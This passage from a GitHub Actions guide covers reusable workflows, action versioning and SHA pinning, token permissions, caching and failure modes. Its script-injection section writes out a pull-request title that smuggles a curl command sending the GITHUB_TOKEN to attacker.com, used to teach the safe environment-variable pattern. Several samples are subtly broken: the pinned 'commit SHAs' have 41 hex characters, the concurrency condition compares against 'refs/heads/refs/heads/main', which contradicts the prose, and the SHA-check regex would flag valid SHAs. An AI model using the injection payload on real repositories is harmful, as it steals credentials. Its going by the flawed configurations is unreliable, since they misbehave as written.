      aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      tf-api-token: ${{ secrets.TF_API_TOKEN }}

  manual-deploy:
    name: Manual Deploy (${{ github.event.inputs.target-environment }})
    if: github.event_name == 'workflow_dispatch'
    uses: ./.github/workflows/terraform-pipeline.yml
    with:
      environment: ${{ github.event.inputs.target-environment }}
      working-directory: infra/${{ github.event.inputs.target-environment }}
      var-file: ${{ github.event.inputs.target-environment }}.tfvars
      action: ${{ github.event.inputs.tf-action }}
    secrets:
      aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
      aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      tf-api-token: ${{ secrets.TF_API_TOKEN }}
```

The concurrency group prevents overlapping pipeline runs for the same branch. The `needs` keyword creates dependencies between reusable workflow calls, so staging deployment waits for dev deployment to succeed. The `secrets` block passes only the specific secrets the called workflow needs, never `secrets: inherit`, which would expose every repository secret to the called workflow's execution context.

### 2.6 Organization-Level Actions and Internal Marketplace

For teams operating at scale, individual repositories referencing third-party actions from the public marketplace creates an unmanageable audit surface. The organizational pattern is to maintain an internal actions repository, typically named `.github` or `github-actions`, that hosts vetted versions of both internal and third-party actions. Workflows across the organization reference these via the `org-name/repo-name@version` syntax.

```yaml
steps:
  - uses: my-org/kube-manifest-validator@v1
    with:
      manifest-path: deploy/
      require-resource-limits: true
  - uses: my-org/tf-pipeline-action@v1
    with:
      working-directory: infra/
      action: plan
```

The `.github` repository can also host organization-level reusable workflows. When a workflow in any repository within the organization references `my-org/.github/.github/workflows/terraform-pipeline.yml@v1`, the runner fetches the workflow file from that repository and SHA. This centralizes the pipeline definition while allowing each consuming repository to parameterize it with environment-specific inputs.

For private repositories, the `GITHUB_TOKEN` in the calling workflow needs read access to the actions repository. Organization administrators can configure this through the organization's Actions sharing settings, which allows private repositories to be used as actions within the organization without exposing them externally.

### 2.7 Versioning Strategies

The versioning strategy for an action determines the balance between update convenience and supply chain security. There are three primary strategies, each with different trust and maintenance profiles.

**Major version floating tags** (e.g., `@v1`) are the most common pattern in the public marketplace. The action maintainer creates a `v1` tag on the first 1.0 release and updates it to point at the latest commit on every subsequent minor and patch release. Consumers automatically receive bug fixes and new features within the major version without changing their workflow files. The risk is that any update could introduce a breaking change or a supply chain compromise, and the consumer has no control over when that update arrives. The following release automation workflow maintains floating major version tags:

**`.github/workflows/release.yml`** (in the action repository)

```yaml
name: Release Action

on:
  push:
    tags:
      - 'v*'

permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          persist-credentials: true

      - name: Parse version
        id: version
        run: |
          TAG="${GITHUB_REF#refs/tags/}"
          MAJOR=$(echo "${TAG}" | grep -oE '^v[0-9]+')
          echo "tag=${TAG}" >> "${GITHUB_OUTPUT}"
          echo "major=${MAJOR}" >> "${GITHUB_OUTPUT}"

      - name: Update major version tag
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git tag -f "${{ steps.version.outputs.major }}" "${{ steps.version.outputs.tag }}"
          git push origin "${{ steps.version.outputs.major }}" --force

      - name: Generate release notes
        id: notes
        run: |
          PREVIOUS_TAG=$(git describe --tags --abbrev=0 "${{ steps.version.outputs.tag }}^" 2>/dev/null || echo "")
          if [[ -n "${PREVIOUS_TAG}" ]]; then
            NOTES=$(git log --pretty=format:"- %s" "${PREVIOUS_TAG}..${{ steps.version.outputs.tag }}" | head -50)
          else
            NOTES=$(git log --pretty=format:"- %s" "${{ steps.version.outputs.tag }}" | head -50)
          fi
          echo "notes<<EOF" >> "${GITHUB_OUTPUT}"
          echo "${NOTES}" >> "${GITHUB_OUTPUT}"
          echo "EOF" >> "${GITHUB_OUTPUT}"

      - name: Create GitHub release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.version.outputs.tag }}
          name: ${{ steps.version.outputs.tag }}
          body: |
            ## Changes in ${{ steps.version.outputs.tag }}

            ${{ steps.version.outputs.notes }}

            **Full Changelog**: https://github.com/${{ github.repository }}/compare/${{ steps.version.outputs.major }}...${{ steps.version.outputs.tag }}
          draft: false
          prerelease: ${{ contains(steps.version.outputs.tag, '-') }}
```

**SHA pinning** is the security-conscious alternative. Each action reference points at a specific commit SHA, which is immutable and cannot be retroactively changed even if the repository is compromised. The trade-off is that updates require explicit workflow changes, which is where Dependabot automation bridges the gap:

**`.github/dependabot.yml`**

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "America/New_York"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "github-actions"
    commit-message:
      prefix: "chore(deps)"
      include: "scope"
    groups:
      actions-updates:
        patterns:
          - "*"
```

Dependabot reads the `uses` references in workflow files, resolves the current SHA for each version tag, and opens pull requests that update the SHA reference. The pull request includes metadata about the changes between the old and new SHAs, and the `actions/dependency-review-action` can enforce license and vulnerability checks before merge:

**`.github/workflows/dependency-review.yml`**

```yaml
name: Dependency Review

on:
  pull_request:
    branches: [main]

permissions:
  contents: read
  pull-requests: write

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@8e5e7a5d7f3d4b9c8a2e1f3a4b5c6d7e8f9a0b1c2
        with:
          persist-credentials: false

      - name: Dependency review
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: moderate
          comment-summary-in-pr: on-failure
          allow-licenses: MIT, Apache-2.0, BSD-3-Clause, ISC, BSD-2-Clause

      - name: Verify action SHAs
        shell: bash
        run: |
          set -euo pipefail
          WORKFLOW_FILES=$(find .github/workflows -name "*.yml" -o -name "*.yaml" 2>/dev/null)
          VIOLATIONS=0
          for file in ${WORKFLOW_FILES}; do
            while IFS= read -r line; do
              if echo "${line}" | grep -qE "uses:.*@[a-zA-Z]"; then
                REPO=$(echo "${line}" | grep -oE "uses:\s*[^@]+" | sed 's/uses:\s*//;s/"//g;s/'"'"'//g' | tr -d ' ')
                TAG=$(echo "${line}" | grep -oE "@[a-zA-Z][a-zA-Z0-9._-]*" | sed 's/@//')
                echo "::warning file=${file}::Action ${REPO} is pinned to tag '${TAG}' instead of a commit SHA"
                VIOLATIONS=$((VIOLATIONS + 1))
              fi
            done < "${file}"
          done
          if [[ ${VIOLATIONS} -gt 0 ]]; then
            echo "::error::Found ${VIOLATIONS} action(s) pinned to version tags instead of commit SHAs"
            exit 1
          fi
```

The SHA verification script scans workflow files for `uses` references that pin to named tags rather than SHAs and fails the check. In a mature setup, this runs on every pull request alongside the dependency review, creating a hard gate against tag-based action references.

### 2.8 Security Boundaries in Third-Party Action Consumption

The `permissions` block is the primary mechanism for limiting the blast radius of the `GITHUB_TOKEN`. By default, the token receives broad permissions: `contents: write`, `packages: write`, `pull-requests: write`, and others. Setting the `permissions` block at the workflow or job level restricts the token to only what the job needs. When you specify any permission in the block, all unspecified permissions default to `none`.

```yaml
permissions:
  contents: read
  pull-requests: write
  id-token: write
  deployments: write
```

This restriction means that a compromised action in the job can only perform operations that the token's permissions allow. An action that tries to push to the repository will fail because `contents` is read-only. An action that tries to modify repository settings will fail because `administration` is not granted.

The `environment` context adds another layer of defense. When a job specifies `environment: production`, GitHub looks up the environment's protection rules before starting the job. If the environment requires manual approval, the job waits in a pending state until a designated reviewer approves it. If the environment has a deployment branch policy, the job only runs from allowed branches. Environment secrets are separate from repository secrets, so a production deployment job with `environment: production` only receives secrets scoped to that environment, not staging or dev secrets.

Script injection is the most common and most dangerous attack vector in GitHub Actions workflows. It occurs when untrusted input from pull request metadata is interpolated directly into a `run` step's shell script. Consider this vulnerable pattern:

```yaml
- name: Build
  run: |
    echo "Building PR: ${{ github.event.pull_request.title }}"
    make build
```

If a malicious pull request has the title `foo" && curl http://attacker.com/?token=$GITHUB_TOKEN && echo "`, the resulting shell script becomes `echo "Building PR: foo" && curl http://attacker.com/?token=$GITHUB_TOKEN && echo ""` and `make build`, which exfiltrates the `GITHUB_TOKEN` to an attacker-controlled server. The token is in the environment of every step, and the shell interprets the interpolated value as code.

The secure pattern passes untrusted values through environment variables:

```yaml
- name: Build
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Building PR: ${PR_TITLE}"
    make build
```

When `PR_TITLE` contains `foo" && curl http://attacker.com/?token=$GITHUB_TOKEN`, the shell expands `${PR_TITLE}` as a variable, not as code. The `echo` command prints the entire string literally, including the quotes and ampersands, because the shell treats the environment variable's value as data, not as instructions to interpret.

The `pull_request_target` trigger deserves specific attention because it is a common source of privilege escalation. This trigger runs the workflow with the base branch's code and the repository's secrets, but it fires on pull requests from forks. If a workflow using `pull_request_target` checks out the pull request's code and executes it, the attacker's code runs with access to the repository's write token and secrets. The safe pattern is to never checkout PR code in `pull_request_target` workflows, or to use a two-workflow pattern where the `pull_request` trigger runs untrusted code in a restricted context and the `pull_request_target` trigger performs privileged operations based on the untrusted workflow's artifacts.

The following workflow demonstrates a safe `pull_request_target` pattern that only labels and comments on pull requests without executing any PR-sourced code:

```yaml
name: PR Triage

on:
  pull_request_target:
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  pull-requests: write

jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - name: Apply labels
        uses: actions/labeler@v5
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}
          configuration-path: .github/labeler.yml
          sync-labels: true

      - name: Welcome first-time contributors
        uses: actions/github-script@v7
        with:
          script: |
            const { data: user } = await github.rest.users.getByUsername({
              username: context.payload.pull_request.user.login
            });
            if (user.type === 'Bot') return;

            const { data: prs } = await github.rest.pulls.list({
              owner: context.repo.owner,
              repo: context.repo.repo,
              state: 'all',
              creator: context.payload.pull_request.user.login,
              per_page: 2
            });

            if (prs.length <= 1) {
              await github.rest.issues.createComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                issue_number: context.issue.number,
                body: [
                  'Thanks for your first contribution!',
                  '',
                  'A maintainer will review this PR shortly.',
                  'Please ensure CI checks pass and the PR description is complete.'
                ].join('\n')
              });
            }
```

This workflow never checks out the pull request's code. It only uses authenticated GitHub API calls through the `actions/github-script` action, which executes trusted code from the base branch. The `GITHUB_TOKEN` has `pull-requests: write` permission, which is sufficient for labeling and commenting but cannot modify repository contents or settings.

## 3. High-Performance Optimization & Failure Modes

### 3.1 Concurrency Control and Run Deduplication

Without concurrency controls, rapid pushes to a branch spawn redundant pipeline runs that consume runner minutes and create race conditions when multiple runs target the same infrastructure. The `concurrency` block provides level-triggered control: it groups runs by a key and either cancels in-progress runs or queues the new run to wait for the current one to finish.

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/refs/heads/main' }}
```

This configuration cancels superseded runs on feature branches but allows production branch runs to queue, preventing a partial deployment scenario where a newer run completes before an older one. The group key should include any dimension that represents a shared resource: workflow name, branch, and optionally a deployment target. For infrastructure workflows that deploy to a specific environment, the group should include the environment name to prevent two concurrent deployments to the same environment.

### 3.2 Caching Strategies

The `actions/cache` action and the built-in caching in `setup-*` actions reduce repetitive tool installation and dependency resolution. The cache is keyed by a user-defined string, and a cache hit skips the expensive setup step entirely.

```yaml
- name: Setup Node.js
  uses: actions/setup-node@v4
  with:
    node-version: '20'
    cache: 'npm'
    cache-dependency-path: package-lock.json

- name: Setup Terraform
  uses: hashicorp/setup-terraform@v3
  with:
    terraform_version: '1.7.3'
    cli_config_credentials_token: ${{ secrets.TF_API_TOKEN }}

- name: Cache Terraform providers
  uses: actions/cache@v4
  with:
    path: |
      ~/.terraform.d/plugin-cache
      ${{ inputs.working-directory }}/.terraform
    key: terraform-${{ runner.os }}-${{ inputs.working-directory }}-${{ hashFiles('**/.terraform.lock.hcl') }}
    restore-keys: |
      terraform-${{ runner.os }}-${{ inputs.working-directory }}-
```

The `hashFiles` function computes a SHA-256 of the matched files and includes it in the cache key. When `.terraform.lock.hcl` changes (which happens when provider versions change), the cache key changes, and the old cache is restored as a fallback via `restore-keys` while the new cache is populated. For Docker actions, layer caching via the GitHub Actions cache backend eliminates the cost of rebuilding the action's image on every run:

```yaml
- name: Build action image
  uses: docker/build-push-action@v5
  with:
    context: .
    file: ./Dockerfile
    push: false
    load: true
    tags: tf-pipeline-action:latest
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

### 3.3 Composite Versus Reusable Workflow Performance Trade-Offs

Composite actions run their steps inline within the calling job, which means there is no runner allocation overhead. The steps share the same job container, filesystem, and tool cache. This makes composite actions ideal for sequences that need to execute quickly and share state between steps: setting up a tool, running a validation, and producing an output. The cost is that composite steps cannot define their own `permissions` or `environment` context, so they run with whatever the calling job provides.

Reusable workflows allocate a separate job for each invocation, which means the runner must provision a new execution environment, checkout the repository, and initialize the job context. This adds 30 to 60 seconds of overhead per call. For pipelines with many small steps, this overhead dominates. For pipelines with complex job graphs, matrix strategies, or environment-protected deployments, the isolation and configurability of reusable workflows justifies the cost.

The decision rule is to use composite actions for step-level composition within a single job and reusable workflows for job-level composition that needs separate permissions, environments, or matrix strategies. A common pattern is a composite action that sets up the toolchain and runs validation, consumed by a reusable workflow that manages the deployment lifecycle across environments.

### 3.4 Failure Modes and Mitigations

**Action timeout** is configured per job with `timeout-minutes`. The default is 360 minutes, which is excessive for most infrastructure workflows. A hung `terraform apply` waiting on a resource that will never converge can consume hours of runner time before the default timeout fires. Setting `timeout-minutes: 30` on infrastructure jobs ensures that hung operations fail fast.

**Docker image pull failures** occur when the base image has been removed, rate limits are hit, or the registry is unreachable. Docker actions that reference `hashicorp/terraform:1.7.3` depend on Docker Hub availability. For production-critical pipelines, mirror the base image to an internal registry and update the Dockerfile `FROM` line to reference the mirror. This eliminates external registry dependency and allows you to control patch timing.

**Node version deprecation** is a scheduled failure. GitHub deprecates old Node.js runtimes for JavaScript actions on a published timeline. Actions that declare `using: 'node16'` stop working after deprecation. The migration to `node20` requires updating the `action.yml`, rebuilding with the matching `@types/node` version, and testing. The runner logs a deprecation warning for months before the cutoff, but teams that ignore these warnings experience sudden workflow failures on the deprecation date.

**Composite action input type coercion** is a subtle failure. All composite inputs are strings, even when the caller passes a boolean or number. A composite step that does `if: ${{ inputs.enabled }}` where `enabled` is declared with `default: 'false'` will always evaluate to true because the string `"false"` is truthy in the GitHub Actions expression language. The correct pattern is `if: ${{ inputs.enabled == 'true' }}` for string comparison.

**Reusable workflow nesting limit** is four levels. A workflow that calls a workflow that calls a workflow that calls a workflow that calls a workflow exceeds the limit and fails at resolution time. This is rarely hit in practice but can occur in organizations that build deep inheritance hierarchies of reusable workflows. The solution is to flatten the hierarchy or use composite actions for the innermost layers.

**Secret redaction failures** happen when a secret value matches a pattern that GitHub's redaction engine does not recognize, or when a secret is transformed (base64-encoded, URL-encoded, split across lines) before being printed. The redaction engine replaces exact matches of secret values in logs with `***`, but if the action prints a transformed version, the original value may appear in the log. The mitigation is to never log secrets directly, even for debugging, and to mask derived values with `core.setSecret()` in JavaScript actions:

```typescript
const encoded = Buffer.from(secretValue).toString('base64');
core.setSecret(encoded);
```

**Supply chain attacks** on actions are the highest-impact failure mode. A compromised action maintainer can push a malicious update to a floating version tag, and every workflow referencing that tag executes the malicious code on the next run. The attack surface includes reading secrets from the environment, modifying repository contents via the `GITHUB_TOKEN`, and exfiltrating source code. The defense in depth is SHA pinning with Dependabot automation, the `permissions` block to limit token scope, environment protection rules for deployment jobs, and the OpenSSF Scorecard for supply chain posture assessment:

```yaml
name: OpenSSF Scorecard

on:
  schedule:
    - cron: '0 6 * * 1'
  push:
    branches: [main]

permissions:
  contents: read
  security-events: write
  id-token: write

jobs:
  scorecard:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@8e5e7a5d7f3d4b9c8a2e1f3a4b5c6d7e8f9a0b1c2
        with:
          persist-credentials: false

      - name: Run Scorecard
        uses: ossf/scorecard-action@v2
        with:
          results_file: scorecard-results.sarif
          results_format: sarif
          publish_results: true

      - name: Upload to code scanning
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: scorecard-results.sarif
```

Scorecard evaluates the repository against supply chain best practices including branch protection, signed commits, dependency update automation, and token permission scoping. The SARIF output integrates with GitHub's code scanning dashboard, making supply chain posture a tracked metric rather than a manual checklist.
